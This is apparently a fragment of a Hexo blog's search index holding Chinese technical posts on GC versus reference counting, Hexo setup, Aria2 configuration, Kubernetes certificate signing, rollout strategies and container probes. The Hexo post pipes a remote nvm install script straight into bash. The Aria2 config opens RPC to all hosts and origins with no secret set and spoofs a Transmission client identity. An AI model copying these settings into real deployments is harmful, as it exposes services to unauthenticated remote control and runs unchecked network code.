库也必须为其做一些优化，例如 stl port 中，对 POD 类型就做了特例化处理。可惜，智能指针不是 POD ，让编译器聪明到合并执行序列中的引用加减，难度太大（考虑到多线程因素，除非编译器可以知道线程的信息，否则几乎不可能实现）。 C++ 在实现面向对象的编程上，比 C 提供了许多便利。其中之一就是，在描述一个对象是另一个对象的一部分时，通过构造和析构函数机制，可以自动化的维护这相关部分的生命期。但它没能在语言上解决的是，当两者之间只是引用关系时，生命期如何处理。前者，我们有几乎唯一的简洁明了的解决之道；而后者根据实际需要可以有多种选择，顾而 C++ 在语言层面不提供一致解决方案。可惜的是 C++ 却一直每能提供一个简洁好用，带有普适性的 GC 库。大家都偏向于更为容易实现的引用计数的方案，这个结果跟具体实现的复杂度有关。毕竟在实现 gc 的时候，C 缺乏必要的语言支持（而 C++ 在实现层面，是从 C 的基础上发展而来）。 再来看看垃圾收集，比较成熟的算法基于标记清除（或标记整理）或其变体。简单说，就是由收集器框架记录下对象和对象之间的联系（这些联系信息存放的位置不重要，可以在对象的内存布局空间上，也可以在独立的地方，关键在于这些信息可以被收集器访问）。确定一个世界的根，定期的从这个根开始遍历这个世界，把有关联的对象标记起来，最后回收没有被标记的对象。 从算法上来看，建立对象和对象之间的联系的时间代价和引用计数的时间代价数量级上是一致的，都是 O(1) 。但实际实现时，前者的代价通常要大一些。空间代价上也是前者略大，但也没有数量级上的差别。 而 GC 管理的对象，在销毁时的代价要小的多。它不需要通知和它有关联的对象。 这就是为什么，许多使用 GC 的软件有时候比使用引用计数的软件运行效率还高那么一点的缘故。 可是，GC 有一个额外的时间代价来源于标记的过程。完成完整的一次清理过程，必然遍历到世界中每一个活着的对象。代价是 O(N) ，N 随着对象总体数量的增加而增加。所以我们应该减少被 GC 管理的对象的数量，在这一点上，手工管理依然有意义。即，明确一个对象是另一个对象的组成部分时，可以考虑用手工管理的方式。 另一个糟糕的地方是，在实现时，我们往往把对象间的关联信息放在了对象本身的内存布局空间中，遍历这个世界中的对象意味着访问所有对象的内存。当虚拟内存空间大于实际物理内存空间时，这意味着页面交换。我觉得，很大程度上，java 或 C# 这样的语言搭建起来的庞大系统偶尔运行缓慢，根本原因就在这里。当然，这些是可以被改进的。并非算法本身的问题。 可以这样说，GC (garbage collection) 把 RC (reference counting) 中那些短期对象的销毁代价转嫁到了一次性的标记清除过程。这把逻辑处理和资源管理正交分解了。这种被分解的问题，会随着硬件的进步更容易提高性能（比如多核的发展）。但是，在较小规模的软件或独立模块中，这个优势并不会太明显。反而 GC 本身远高于 RC 的复杂性，会成为其软肋。 对于不需要面向对象的软件，甚至连资源自动化管理都不需要。这时，无论是 GC 还是 RC 都无用武之地。","link":"/hexo-blog/2016/09/09/%E5%BC%95%E7%94%A8%E8%AE%A1%E6%95%B0%E4%B8%8E%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E4%B9%8B%E6%AF%94%E8%BE%83/"},{"title":"Hello, Hexo.","text":"周末折腾了半天，终于将博客从 Pelican 转到了 Hexo，在此记录一下。 方案选择首先说说方案选择，目前博客系统大致分为静态和动态两类，动态博客有 Wordpress、Ghost 等等，因为需要单独的主机和搭建环境，并且数据存在 DB 迁移起来比较费劲，所以放弃了这种方案；静态博客有 Pelican、Jekyll、Hexo 等等，后者很多优点，访问速度快，博客可直接用 Markdown 以文件的形式保存在 Github，借助 Github Pages 部署方便，不用自己搭建主机，总之个人觉得这些优点可以完爆动态博客。 笔者之前的博客是基于 Pelican 的，因为使用 Python 写的，而自己对 Python 有一种痴迷，因此之前选用了这种方案，但是慢慢发现缺点有很多。首先是渲染速度慢，当文章越来越多时，博客生成的时间就会让人难以忍受。另外 Pelican 的主题都不是很炫，找了半天都没有找到好看的主题，这也是促使我选用其他博客系统的一个原因。 其次了解了 Jekyll，它是用 Ruby 开发的，也是 Github 主推的博客系统，和 Github 无缝结合，可以直接在 Github 页面上配置、修改主题（教程在此），主题也很多，如果没有遇见 Hexo，也许我会选择 Jekyll。 Hexo 使用 Nodejs 开发，渲染速度相对于 Python 和 Ruby 来说很快，而且 CLI 设计也非常人性化，配置简单，支持的插件也有很多，使用 npm 来管理。也许正是由于开发语言的关系，Hexo 的主题质量都非常高，都非常好看，让人眼花缭乱（https://hexo.io/themes/index.html）。老实说我是被这款名叫 AlphaDust 的主题吸引了，非常有科技感，而且响应式在移动设备上也比较完美，无论是英文字体还是中文字体都支持很好，对作者的敬意油然而生。当然 NexT 也是一款非常优秀的主题，以后有机会可以尝试一下（^_^）。 安装和配置安装可以参考官方文档。 首先安装 nvm： 1$ curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.2/install.sh | bash 安装完成后重启终端，安装 nodejs 和 hexo： 12$ nvm install stable$ npm install -g hexo-cli 创建一个新的博客项目： 123$ hexo init &lt;folder&gt;$ cd &lt;folder&gt;$ npm install 配置这里要注意的是如果使用 Github Pages，URL 包含子目录时，要注意设置 _config.yml 中的 url 和 root。 12url: http://whypro.github.io/hexo-blogroot: /hexo-blog/ 文章 URL 和文件名的配置按照个人喜好来修改： 12permalink: :year:month:day/:title/new_post_name: :year:month:day-:title.md 部署 Github Pages首先在配置文件中加入 Github 相关信息： 1234deploy: type: git repository: git@github.com:&lt;username&gt;/&lt;reponame&gt;.git branch: gh-pages 然后执行： 12$ hexo generate$ hexo deploy 后续工作至于博客的全文搜索，可以用 Swiftype 服务，有空再研究一下。 关于代码高亮可以参考 CSS classes reference。 参考文献[1] 博客从 Ghost 迁移到 Hexo","link":"/hexo-blog/2017/09/23/hello-hexo/"},{"title":"Aria2 配置备忘","text":"Aria2 是一款轻量级的命令行下载工具，支持 HTTP/HTTPS、FTP、SFTP、BitTorrent 和 Metalink 等链接格式，提供 JSON-RPC 和 XML-RPC 管理接口，是一款优秀的 Linux 版迅雷替代品。 Aria2 Server1234mkdir /etc/aria2touch /etc/aria2/save-session.listmkdir /var/log/aria2 将以下内容保存至 /etc/aria2/aria2.conf： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126## '#'开头为注释内容, 选项都有相应的注释说明, 根据需要修改 #### 被注释的选项填写的是默认值, 建议在需要修改时再取消注释 #### 文件保存相关 ### 文件的保存路径(可使用绝对路径或相对路径), 默认: 当前启动位置dir=/home/whypro/aria2# 启用磁盘缓存, 0为禁用缓存, 需1.16以上版本, 默认:16M#disk-cache=32M# 文件预分配方式, 能有效降低磁盘碎片, 默认:prealloc# 预分配所需时间: none &lt; falloc ? trunc &lt; prealloc# falloc和trunc则需要文件系统和内核支持# NTFS建议使用falloc, EXT3/4建议trunc, MAC 下需要注释此项#file-allocation=none# 断点续传continue=true## 下载连接相关 ### 最大同时下载任务数, 运行时可修改, 默认:5#max-concurrent-downloads=5# 同一服务器连接数, 添加时可指定, 默认:1max-connection-per-server=10# 最小文件分片大小, 添加时可指定, 取值范围1M -1024M, 默认:20M# 假定size=10M, 文件为20MiB 则使用两个来源下载; 文件为15MiB 则使用一个来源下载min-split-size=10M# 单个任务最大线程数, 添加时可指定, 默认:5#split=5# 整体下载速度限制, 运行时可修改, 默认:0#max-overall-download-limit=0# 单个任务下载速度限制, 默认:0#max-download-limit=0# 整体上传速度限制, 运行时可修改, 默认:0#max-overall-upload-limit=0# 单个任务上传速度限制, 默认:0#max-upload-limit=0# 禁用IPv6, 默认:falsedisable-ipv6=true# 连接超时时间, 默认:60timeout=600# 最大重试次数, 设置为0表示不限制重试次数, 默认:5max-tries=0# 设置重试等待的秒数, 默认:0retry-wait=30## 进度保存相关 ### 从会话文件中读取下载任务input-file=/etc/aria2/save-session.list# 在Aria2退出时保存`错误/未完成`的下载任务到会话文件save-session=/etc/aria2/save-session.list# 定时保存会话, 0为退出时才保存, 需1.16.1以上版本, 默认:0#save-session-interval=60## RPC相关设置 ### 启用RPC, 默认:falseenable-rpc=true# 允许所有来源, 默认:falserpc-allow-origin-all=true# 允许非外部访问, 默认:falserpc-listen-all=true# 事件轮询方式, 取值:[epoll, kqueue, port, poll, select], 不同系统默认值不同#event-poll=select# RPC监听端口, 端口被占用时可以修改, 默认:6800#rpc-listen-port=6800# 设置的RPC授权令牌, v1.18.4新增功能, 取代 --rpc-user 和 --rpc-passwd 选项#rpc-secret=&lt;TOKEN&gt;# 设置的RPC访问用户名, 此选项新版已废弃, 建议改用 --rpc-secret 选项#rpc-user=&lt;USER&gt;# 设置的RPC访问密码, 此选项新版已废弃, 建议改用 --rpc-secret 选项#rpc-passwd=&lt;PASSWD&gt;# 是否启用 RPC 服务的 SSL/TLS 加密,# 启用加密后 RPC 服务需要使用 https 或者 wss 协议连接#rpc-secure=true# 在 RPC 服务中启用 SSL/TLS 加密时的证书文件,# 使用 PEM 格式时，您必须通过 --rpc-private-key 指定私钥#rpc-certificate=/path/to/certificate.pem# 在 RPC 服务中启用 SSL/TLS 加密时的私钥文件#rpc-private-key=/path/to/certificate.key## BT/PT下载相关 ### 当下载的是一个种子(以.torrent结尾)时, 自动开始BT任务, 默认:true#follow-torrent=true# BT监听端口, 当端口被屏蔽时使用, 默认:6881-6999listen-port=51413# 单个种子最大连接数, 默认:55#bt-max-peers=55# 打开DHT功能, PT需要禁用, 默认:trueenable-dht=false# 打开IPv6 DHT功能, PT需要禁用#enable-dht6=false# DHT网络监听端口, 默认:6881-6999#dht-listen-port=6881-6999# 本地节点查找, PT需要禁用, 默认:false#bt-enable-lpd=false# 种子交换, PT需要禁用, 默认:trueenable-peer-exchange=false# 每个种子限速, 对少种的PT很有用, 默认:50K#bt-request-peer-speed-limit=50K# 客户端伪装, PT需要peer-id-prefix=-TR2770-user-agent=Transmission/2.77# 当种子的分享率达到这个数时, 自动停止做种, 0为一直做种, 默认:1.0seed-ratio=0# 强制保存会话, 即使任务已经完成, 默认:false# 较新的版本开启后会在任务完成后依然保留.aria2文件#force-save=false# BT校验相关, 默认:true#bt-hash-check-seed=true# 继续之前的BT任务时, 无需再次校验, 默认:falsebt-seed-unverified=true# 保存磁力链接元数据为种子文件(.torrent文件), 默认:falsebt-save-metadata=true## 其他相关 ### 日志级别，可以为debug, info, notice, warn 或 errorlog-level=notice# 日志文件，根据实际情况修改log=/var/log/aria2/aria2.log# 下载进度输出的间隔时间summary-interval=120# 是否以守护进程的方式启动daemon=true Systemd Service将以下内容保存至 aria2c.service 放入 /lib/systemd/system/ 目录 12345678910111213[Unit]Description=aria2c -- file download managerAfter=network.target[Service]Type=forkingUser=%iWorkingDirectory=%hEnvironment=VAR=/var/%iExecStart=/usr/bin/aria2c --conf-path=/etc/aria2/aria2.conf[Install]WantedBy=multi-user.target 之后执行 123systemctl daemon-reloadsystemctl start aria2csystemctl enable aria2c Web UIAria2WebUI http://webui-aria2.ghostry.cn/ https://ziahamza.github.io/webui-aria2/ YAAW: Chrome 插件 参考文献[1] Raspberry Pi技术笔记之四：使用aria2打造下载利器[2] Aria2 &amp; YAAW 使用说明[3] aria2c docs","link":"/hexo-blog/2017/10/15/Aria2-%E9%85%8D%E7%BD%AE%E5%A4%87%E5%BF%98/"},{"title":"Kubernetes APIServer 证书的手动签发","text":"背景有时我们需要将自定义的域名或 IP 加入到 apiserver 的证书中，以通过 kubectl 或 kubelet 等客户端的验证，这个时候就需要对 apiserver 证书中包含的 IP 和 DNS 信息做些修改。 概念首先介绍几个概念： KEY: 私钥 CSR: Certificate Signing Request 证书签名请求（公钥） CRT: Certificate 证书 x.509: 一种证书格式 PEM: X.509 证书文件具体的存储格式（有时候用 pem 代替 crt 后缀） 步骤重新生成 apiserver 证书的步骤： 创建 2048bit 的 ca.key （/etc/kubernetes/pki 目录已经存在可跳过） 1openssl genrsa -out ca.key 2048 基于 ca.key 创建 ca.crt （/etc/kubernetes/pki 已经存在可跳过） 1openssl req -x509 -new -nodes -key ca.key -subj &quot;/CN=kube-apiserver&quot; -days 10000 -out ca.crt 创建 2048bit 的 server.key （/etc/kubernetes/pki 已经存在可跳过） 1openssl genrsa -out apiserver.key 2048 编辑创建 csr 需要的配置文件 根据需要添加或修改相应字段 123456789101112131415161718192021222324252627[ req ]default_bits = 2048prompt = nodefault_md = sha256req_extensions = req_extdistinguished_name = dn [ dn ]CN = kube-apiserver [ req_ext ]subjectAltName = @alt_names [alt_names]DNS.1 = kubernetesDNS.2 = kubernetes.defaultDNS.3 = kubernetes.default.svcDNS.4 = kubernetes.default.svc.cluster.localDNS.5 = haoyu-k8s-1IP.1 = 10.96.0.1IP.2 = 172.21.1.13IP.3 = 183.2.220.210 [ v3_ext ]keyUsage=critical, digitalSignature, keyEnciphermentextendedKeyUsage=serverAuthsubjectAltName=@alt_names 创建 server.csr 1openssl req -new -key apiserver.key -out apiserver.csr -config csr.conf 基于 ca.key ca.crt server.csr 创建 server.crt 1openssl x509 -req -in apiserver.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out apiserver.crt -days 10000 -extensions v3_ext -extfile csr.conf 查看生成的 server.crt 1openssl x509 -noout -text -in ./apiserver.crt 最好和原证书 diff 一下，以保证其他字段一致 对于多个 apiserver 高可用的场景，方便起见可以将生成的 apiserver.crt 和 apiserver.key 一同拷贝到多个节点的 /etc/kubernetes/pki 目录下（使用同一份私钥和证书）。 示例csr.conf: 主要关注 alt_names 的 DNS 和 IP 字段： 123456789101112131415161718192021222324252627282930313233[ req ]default_bits = 2048prompt = nodefault_md = sha256req_extensions = req_extdistinguished_name = dn [ dn ]CN = kube-apiserver [ req_ext ]subjectAltName = @alt_names [alt_names]DNS.1 = kubernetesDNS.2 = kubernetes.defaultDNS.3 = kubernetes.default.svcDNS.4 = kubernetes.default.svc.cluster.localDNS.5 = kubernetes.kube-system.svc.cluster.localDNS.6 = host1DNS.7 = host2DNS.8 = host3 IP.1 = 172.16.0.1IP.2 = 10.200.20.11IP.3 = 10.200.20.12IP.4 = 10.200.20.13IP.5 = 10.200.20.200 [ v3_ext ]keyUsage=critical, digitalSignature, keyEnciphermentextendedKeyUsage=serverAuthsubjectAltName=@alt_names cert.sh: 根据 csr.conf 自动签发 apiserver.crt，并拷贝至 /etc/kubernetes/pki 目录： 12345678910openssl req -new -key /etc/kubernetes/pki/apiserver.key -out apiserver.csr -config csr.confopenssl x509 -req -in apiserver.csr -CA /etc/kubernetes/pki/ca.crt -CAkey /etc/kubernetes/pki/ca.key -CAcreateserial -out apiserver.crt -days 10000 -extensions v3_ext -extfile csr.conf openssl x509 -noout -text -in /etc/kubernetes/pki/apiserver.crt &gt; apiserver.crt.old.txtopenssl x509 -noout -text -in apiserver.crt &gt; apiserver.crt.txtdiff apiserver.crt.txt apiserver.crt.old.txt mv /etc/kubernetes/pki/apiserver.crt /etc/kubernetes/pki/apiserver.crt.bak.$(date +%Y%m%d%H%M%S)cp apiserver.crt /etc/kubernetes/pki/apiserver.crtchmod 400 /etc/kubernetes/pki/apiserver.crt 参考 https://kubernetes.io/docs/concepts/cluster-administration/certificates/","link":"/hexo-blog/2017/12/06/Kubernetes-APIServer-%E8%AF%81%E4%B9%A6%E7%9A%84%E6%89%8B%E5%8A%A8%E7%AD%BE%E5%8F%91/"},{"title":"Kubernetes 服务灰度升级最佳实践","text":"本文主要介绍了 Deployment 和 StatefulSet 的升级机制和扩缩容机制，以及一些常用的配置项。并分别介绍了以这两种方式部署 Pod 时的对服务进行升级（包括滚动发布、蓝绿发布、灰度／金丝雀发布）的最佳实践。 Deployment升级机制RolloutDeployment 的 rollout 在 .spec.template 被修改时触发（比如镜像地址更新、Pod label 更新等等），其他修改（.spec.replicas 更新）不会触发。 更新时，k8s 通过计算 pod-template-hash，创建新的 ReplicaSet，由新的 rs 启动新的 Pod，不断替换旧 rs 的 Pod。 通过命令 1kubectl -n &lt;namespace&gt; rollout status deployment/&lt;deployment-name&gt; 查看 Deployment rollout 的状态。 .spec.strategy 定义了更新 Pod 的策略： 123456minReadySeconds: 5strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 1 spec.strategy.type 可以为 Recreate 或 RollingUpdate。Recreate 先删掉旧 Pod 再创建新 Pod，RollingUpdate 则按照滚动升级的策略来更新。 maxUnavailable：更新时，Deployment 确保不超过 25%（默认值） 的 Pod 处于 unavailable 状态。既可以是数量也可以是百分比，当 maxSurge 为 0 时 maxUnavailable 不能为 0。 maxSurge：更新时，Deployment 确保当前实际创建的 Pod 数（包括新旧实例总和）不超过期望 Pod 数的 25%（默认值）。既可以是数量也可以是百分比。 minReadySeconds：新创建的 Pod 变为 Ready 状态的最少时间，如果容器在该时间内没有 crash，则认为该 Pod 是 available 的。默认值为 0，表示一旦 readiness probe 通过后就变为 Ready，这时如果没有配置 readinessProbe，则只要 Pod 创建后就会为 Ready 状态，可能会导致服务不可用。 Rollover当 Deployment 在 rollout 过程中被更新时，Deployment 会立即执行新的更新，停止之前的 rollout 动作，并根据期望实例数删除（缩容）之前的 Pod，这个过程叫做 rollover。 Rollback获取 Deployment 的 rollout 历史，最新的 revision 即当前版本 1kubectl -n &lt;namespace&gt; rollout history deployment/&lt;deployment-name&gt; 查看指定 revision 的详细信息 1kubectl -n &lt;namespace&gt; rollout history deployment/&lt;deployment-name&gt; --revision=&lt;revision_num&gt; 回滚到上一个版本 1kubectl -n &lt;namespace&gt; rollout undo deployment/&lt;deployment-name&gt; 回滚到指定版本 1kubectl -n &lt;namespace&gt; rollout undo deployment/&lt;deployment-name&gt; --to-revision=&lt;revision_num&gt; 当 Deployment 回滚成功时，会生成 DeploymentRollback 事件 可以通过 .spec.revisionHistoryLimit 配置最多保留的 revision 历史个数（不包括当前版本），默认值为 2，即保留 3 个 revision。 Pause/Resume当 Deployment 的 .spec.paused = true 时，任何更新都不会被触发 rollout。通过如下命令设置 Deployment 为 paused： 1kubectl -n &lt;namespace&gt; rollout pause deployment/&lt;deployment-name&gt; 还原： 1kubectl -n &lt;namespace&gt; rollout resume deploy/&lt;deployment-name&gt; 扩缩容机制手动扩缩容可以通过修改 .spec.replicas，或者执行 kubectl 命令的方式对 Deployment 进行扩缩容： 1kubectl scale deployment nginx-deployment --replicas=10 自动扩缩容k8s 支持通过创建 HorizontalPodAutoscaler，根据 CPU 利用率或者服务提供的 metrics，对 Deployment、Replication Controller 或者 ReplicaSet 进行自动扩缩容。 1kubectl autoscale deployment nginx-deployment --min=10 --max=15 --cpu-percent=80 详细请参考： https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale/ https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale-walkthrough/ 发布最佳实践滚动发布滚动发布是 Deployment 默认支持的更新方式，除了上文介绍的 rollingUpdate 相关配置外，不需要其他特殊的配置工作， 灰度／金丝雀发布金丝雀发布通过同时创建两个 Deployments 来实现，通过 track 标签区分两个版本，稳定版本的 Deployment 定义如下： 123456789name: frontendreplicas: 3...labels: app: guestbook tier: frontend track: stable...image: gb-frontend:v3 金丝雀版本的定义如下： 123456789name: frontend-canaryreplicas: 1...labels: app: guestbook tier: frontend track: canary...image: gb-frontend:v4 再配置 service 的 labelSelector 将流量同时导入两个版本的 Pod 123selector: app: guestbook tier: frontend 通过 .spec.replicas 数量和扩缩容机制可以灵活配置稳定版本和金丝雀版本的比例（上面的例子为 3:1），流量会按照这个比例转发至不同版本，一旦线上测试无误后，将 track = stable 的 Deployment 更新为新版本镜像，再删除 track = canary 的 Deployment 即可。 蓝绿发布与金丝雀发布类似，同时创建 2 个label 不同的 Deployment，例如，deployment-1 定义如下： 123456789name: frontendreplicas: 3...labels: app: guestbook tier: frontend version: v3...image: gb-frontend:v3 deployment-2 定义如下： 123456789name: frontendreplicas: 3...labels: app: guestbook tier: frontend version: v4...image: gb-frontend:v4 金丝雀发布通过修改 Deployment 的 replicas 数量和 Pod 镜像地址实现流量切换，而蓝绿发布通过修改 Service 的 labelSelector 实现流量切换。 原 service 定义如下： 1234selector: app: guestbook tier: frontend version: v3 切量时修改为： 1234selector: app: guestbook tier: frontend version: v4 StatefulSetStatefulSet 相对于 Deployment，具有以下特点： 稳定：唯一的 Pod 名称，唯一的网络ID，持久化存储 有序：部署和伸缩都按照顺序执行，滚动升级按照顺序执行 升级机制 .spec.updateStrategy 定义了升级 StatefulSet 的 Pod 的行为 .spec.updateStrategy.type 为 OnDelete （默认行为）时，用户手动删除 Pod 后，新的 Pod 才会创建；为 RollingUpdate 时，k8s 按照 {N-1 .. 0} 的顺序滚动更新每个 Pod。 .spec.updateStrategy.rollingUpdate.partition 可以实现灰度发布，当 StatefulSet 更新时，所有序号大于或等于 partition 的 Pod 会滚动更新；所有序号小于 partition 的 Pod 不会更新，即使被删掉，也会创建旧版本的 Pod。当 partition 大于 replicas 时，任何 Pod 都不会被更新。 配置示例如下： 123456spec: replicas: 10 updateStrategy: type: RollingUpdate rollingUpdate: partition: 7 # 7, 8, 9 will be rolling updated StatefulSet 也支持 kubectl rollout 命令，使用方法同 Deployment。 扩缩容机制可以通过 spec.podManagementPolicy 来配置 StatefulSet 的扩缩容策略 12spec: podManagementPolicy: OrderdReady OrderedReady默认行为 扩容时，Pod 按照 {0 .. N-1} 依次创建，并且前一个 Running／Ready 之后，后一个才会创建 缩容时，Pod 按照 {N-1 .. 0} 依次删除，前一个完全删除之后，后一个才会开始删除 Parallel扩缩容时忽略顺序，并发创建或删除 注意，该配置仅仅对扩缩容（修改 replicas）的情况有效，升级 StatefulSet 时 k8s 依然按照次序来更新 Pod。 唯一网络 ID每个 Pod 都有唯一的 hostname，格式为 -&lt;Pod 序号&gt;，domain name 的格式为 ..svc.cluster.local，通过该 domain name 可以解析到 StatefulSet 下所有的 Pod。通过 -&lt;Pod 序号&gt;...svc.cluster.local 可以解析到指定 Pod。 稳定存储通过配置 StatefulSet 的 volumeClaimTemplates，k8s 会为每个 Pod 创建 PV 和 PVC 并绑定。当 Pod 删除时，对应的 PVC 不会被删除，当重新创建时，仍然会绑定到之前的 PV。 123456789volumeClaimTemplates:- metadata: name: www spec: accessModes: [ &quot;ReadWriteOnce&quot; ] storageClassName: &quot;my-storage-class&quot; resources: requests: storage: 1Gi 发布最佳实践滚动发布滚动发布需要配置 .spec.updateStrategy.type 为 RollingUpdate，StatefulSet 的默认行为是按照 {N-1 .. 0} 的顺序依次更新。 123spec: updateStrategy: type: RollingUpdate 蓝绿发布蓝绿发布与 Deployment 的方式相同，通过创建 2 个 StatefulSet，修改 Service 的方式实现切量。 灰度／金丝雀发布金丝雀发布通过修改 StatefulSet 的 .spec.updateStrategy.rollingUpdate.partition 的值来实现发布。 例如 replicas 为 10 时，Pod 的序号为 0 - 9，首先将 partition 设置为 7，再修改 StatefulSet 的 Pod template 配置，会依次触发 Pod 9, 8, 7 的滚动更新，Pod 0-6 依然维持老版本，此时老版本与旧版本的比例为 7:3。线上验证无误后，再将 partition 设置为 0，依次触发 Pod 6 - 0 的滚动更新，此时全部更新至新版本。 123456spec: replicas: 10 updateStrategy: type: RollingUpdate rollingUpdate: partition: 7 # 7, 8, 9 will be rolling updated Replication Controller （官方已不推荐使用）kubectl rolling-update 只适用于 Replication Controllers，已经被 Deployment 取代，在此不过多介绍。 https://kubernetes.io/docs/tasks/run-application/rolling-update-replication-controller/ 参考 Deployment：https://kubernetes.io/docs/concepts/workloads/controllers/deployment/ Deployment Rolling Update：https://tachingchen.com/blog/kubernetes-rolling-update-with-deployment/ 金丝雀部署：https://kubernetes.io/docs/concepts/cluster-administration/manage-deployment/#canary-deployments 微服务部署：蓝绿部署、滚动部署、灰度发布、金丝雀发布：https://www.jianshu.com/p/022685baba7d StatefulSet：https://kubernetes.io/docs/concepts/workloads/controllers/statefulset/","link":"/hexo-blog/2018/03/01/Kubernetes-%E6%9C%8D%E5%8A%A1%E7%81%B0%E5%BA%A6%E5%8D%87%E7%BA%A7%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/"},{"title":"Kubernetes 容器生命周期管理","text":"健康检查和就绪检查健康检查（Liveness Probe）如果设置了 livenessProbe，k8s (kubelet) 会每隔 n 秒执行预先配置的行为来检查容器是否健康 当健康检查失败时，k8s 会认为容器已经挂掉，会根据 restartPolicy 来对容器进行重启或其他操作。 每次检查有 3 种结果，Success、Failure、Unknown 如果不配置，默认的检查状态为 Success 什么时候不需要健康检查：如果服务在异常后会自动退出或 crash，就不必配置健康检查，k8s 会按照重启策略来自动操作。 什么时候需要健康检查：相反，如果服务异常必须由 k8s 主动介入来重启容器，就需要配置健康检查 就绪检查（Readiness Probe）如果设置了 readinessProbe，k8s (kubelet) 会每隔 n 秒检查容器对外提供的服务是否正常 当就绪检查失败时，k8s 会将 Pod 标记为 Unready，将 Pod IP 从 endpoints 中剔除，即不会让之后的流量通过 service 发送过来。 在首次检查之前，初始状态为 Failure 如果不配置，默认的状态为 Success 什么时候需要就绪检查：如果在服务启动后、初始化完成之前不想让流量过来，就需要配置就绪检查。 什么时候不需要就绪检查：除了上述场景，在 Pod 被删除时，k8s 会主动将 Pod 置为 UnReady 状态，之后的流量也不会过来，因此针对这种情况不必配置就绪检查。 参数健康／就绪检查支持以下参数： initialDelaySeconds: 容器启动后，进行首次检查的等待时间（秒） periodSeconds: 每次检查的间隔时间（秒） timeoutSeconds: 执行检查的超时时间（秒），默认值为 1，最小值是 1 successThreshold: 检查失败时，连续成功 n 次后，认为该容器的健康／就绪检查成功。默认值为 1，最小值是 1，对于健康检查必须为 1 failureThreshold: 连续失败 n 次后，认为该容器的健康／就绪检查失败。默认值为 3，最小值是 1 检查方式Exec 方式12345livenessProbe: exec: command: - cat - /tmp/healthy HTTP GET 请求方式1234567livenessProbe: httpGet: path: /healthz port: 8080 httpHeaders: - name: X-Custom-Header value: Awesome 支持的参数包括： host: 目标主机地址，默认值为 pod IP scheme: HTTP 或 HTTPS，默认为 HTTP path: 访问路径 httpHeaders: 自定义请求头 port: 目标端口号，有效值 1~65535 TCP Socket 方式123livenessProbe: tcpSocket: port: 8080 支持的参数包括： host: 目标主机地址，默认值为 pod IP port: 目标端口号，有效值 1~65535 容器重启策略restartPolicy 是 livenessProbe Failure 后执行的策略，作用于 Pod 的每个容器，可以配置为 Always、OnFaiiure、Never，默认值为 Always。 restartPolicy 只会影响本机节点重启容器的策略，并不会影响 Pod 重新调度的行为，重启的方式按照时间间隔（10s, 20s, 40s, …, 5min）来重启容器，并且每 10min 重置间隔时间 重启策略 restartPolicy 的配置通过以下几个场景来举例说明： Pod Running 状态，包含 1 个容器，容器正常退出 记录 completion 事件 Always: 重启容器，Pod phase 保持 Running 状态 OnFaiiure: 不重启容器，Pod phase 变为 Succeeded Never: 不重启容器，Pod phase 变为 Succeeded Pod Running 状态，包含 1 个容器，容器异常退出 记录 failure 事件 Always: 重启容器，Pod phase 保持 Running 状态 OnFaiiure: 重启容器，Pod phase 保持 Running 状态 Never: 不重启容器，Pod phase 变为 Failed Pod Running 状态，包含 2 个容器，其中一个容器异常退出 记录 failure 事件 Always: 重启容器，Pod phase 保持 Running 状态 OnFaiiure: 重启容器，Pod phase 保持 Running 状态 Never: 不重启容器，Pod phase 保持 Running 状态 此时如果第二个容器退出（无论正常还是异常） 记录 failure 事件 Always: 重启容器，Pod phase 保持 Running 状态 OnFaiiure: 重启容器，Pod phase 保持 Running 状态 Never: 不重启容器，Pod phase 变为 Failed Pod Running 状态，包含 1 个容器，容器被 OOM (out of memory) killed 记录 OOM 事件 Always: 重启容器，Pod phase 保持 Running 状态 OnFaiiure: 重启容器，Pod phase 保持 Running 状态 Never: 不重启容器，Pod phase 变为 Failed Pod Running 状态，遇到节点异常（比如磁盘挂掉、segmented out） 根据异常原因记录相应事件 无论设置为哪种策略，Pod 状态变为 Failed，并尝试在其他节点重新创建（如果 Pod 是通过 Controller 管理的） 容器生存周期事件处理k8s 在容器创建或终止时会发送 postStart 或 preStop 事件，用户可以通过配置 handler，对这两个容器事件进行处理。 k8s 在容器创建之后发送 postStart 事件，postStart handler 是异步执行，所以并不保证会在容器的 entrypoint 之前执行，不过容器代码会阻塞住直到 postStart handler 执行完成。执行成功后，容器状态才会设为 Running k8s 在容器 terminate 之前发送 preStop 事件，terminate 行为会阻塞，直到 preStop handler 同步执行成功或者 Pod 配置的 grace period 超时 (terminationGracePeriodSeconds)。注意：如果不是主动终止，k8s 不会发送 preStop 事件（比如正常退出）。 如果 postStart 或 preStop handler 执行失败，k8s 直接 kill 掉容器。 handler 执行方式Exec 方式1234lifecycle: postStart: exec: command: [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo Hello from the postStart handler &gt; /usr/share/message&quot;] HTTP GET 方式12345678lifecycle: postStart: httpGet: path: /healthz port: 8080 httpHeaders: - name: X-Custom-Header value: Awesome 配置示例livenessProbe 和 readinessProbe 的配置项完全相同，只是检查失败后的行为不同 lifecycle 的 exec 和 httpGet 和 livenessProbe 对应的配置项相同。 123456789101112131415161718192021222324252627282930apiVersion: v1kind: Podmetadata: name: examplespec: containers: - name: example // ... livenessProbe: exec: command: - cat - /tmp/healthy initialDelaySeconds: 5 periodSeconds: 10 readinessProbe: tcpSocket: port: 8080 initialDelaySeconds: 10 periodSeconds: 10 lifecycle: postStart: exec: command: [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo Hello from the postStart handler &gt; /usr/share/message&quot;] preStop: httpGet: host: xxx.xxx.xxx path: /stop port: 8080 restartPolicy: OnFailure 参考Pod 生命周期：https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/ 健康检查和就绪检查：https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-probes/ 